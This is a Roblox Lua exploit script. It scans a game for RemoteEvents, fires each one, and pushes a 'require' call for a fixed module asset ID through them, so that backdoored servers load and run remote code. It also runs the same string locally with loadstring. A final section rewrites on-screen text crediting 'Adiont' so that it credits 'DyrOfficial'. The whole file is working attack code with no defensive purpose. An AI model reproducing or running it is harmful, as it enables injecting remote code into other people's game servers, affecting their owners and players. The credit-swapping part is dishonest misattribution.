local moduleId = 100263845596551
local player = game.Players.LocalPlayer
local style = "Standard"

local infectedRemotes, testedRemotes, firedRemotes = {}, {}, {}
local loaded = false

local code = ("require(%d)(%q, ColorSequence.new(Color3.fromRGB(255,255,255), Color3.fromRGB(255,255,255)), %q)")
    :format(moduleId, player and player.Name or "Player", style)

local function handleRemote(remote)
    if not remote or testedRemotes[remote] then return end
    if remote.Name == "JoinTeam" then return end
    testedRemotes[remote] = true
    if not pcall(function() remote:FireServer("") end) then return end
    infectedRemotes[#infectedRemotes+1] = remote
end

local function scanService(service)
    for _, obj in ipairs(service:GetDescendants()) do
        if obj:IsA("RemoteEvent") then handleRemote(obj) end
    end
end

scanService(game:GetService("ReplicatedStorage"))
scanService(game:GetService("Workspace"))

if not loaded then
    loaded = true
    pcall(function() loadstring(code)() end)
    for _, remote in ipairs(infectedRemotes) do
        if not firedRemotes[remote] then
            firedRemotes[remote] = true
            pcall(function() remote:FireServer(code) end)
        end
    end
end

game.DescendantAdded:Connect(function(d)
    if d:IsA("RemoteEvent") then pcall(handleRemote, d) end
end)

local TARGET, REPLACE = "Made only by Adiont", "Made by DyrOfficial"
local watched = setmetatable({}, {__mode = "k"})

local function shouldWatch(o)
    return o and o.Parent and (o:IsA("TextLabel") or o:IsA("TextButton"))
end

local function setIfTarget(o)
    if o.Text == TARGET then
        pcall(function() o.Text = REPLACE end)
    end
end

local function watchText(o)
    if not shouldWatch(o) or watched[o] then return end
    watched[o] = true
    pcall(setIfTarget, o)

    pcall(function()
        o:GetPropertyChangedSignal("Text"):Connect(function()
            if o.Text == TARGET then pcall(function() o.Text = REPLACE end) end
        end)
    end)
end

for _, v in ipairs(game:GetDescendants()) do
    pcall(watchText, v)
end

game.DescendantAdded:Connect(function(d)
    pcall(watchText, d)
end)
